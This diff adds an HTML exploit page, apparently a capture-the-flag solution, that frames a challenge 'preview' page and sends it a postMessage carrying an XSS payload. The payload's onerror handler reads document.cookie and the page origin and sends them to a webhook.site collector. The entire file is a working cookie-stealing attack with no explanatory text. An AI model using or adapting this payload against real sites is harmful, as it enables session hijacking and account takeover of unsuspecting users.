@@ -1,0 +1,14 @@
+<iframe
+  id="p"
+  src="https://e8172bdf-5144-485c-9afe-74c306e1a31b.offsec.m0lecon.it/preview"
+  style="width:600px;height:300px">
+</iframe>
+
+<script>
+p.onload = () => {
+  p.contentWindow.postMessage({
+    html: `<img src=x onerror="fetch('https://webhook.site/a5eb2701-74ea-4776-b731-28bad71f9550?origin='+encodeURIComponent(location.origin)+'&cookie='+encodeURIComponent(document.cookie))">`,
+    subject: 'test'
+  }, '*');
+};
+</script>
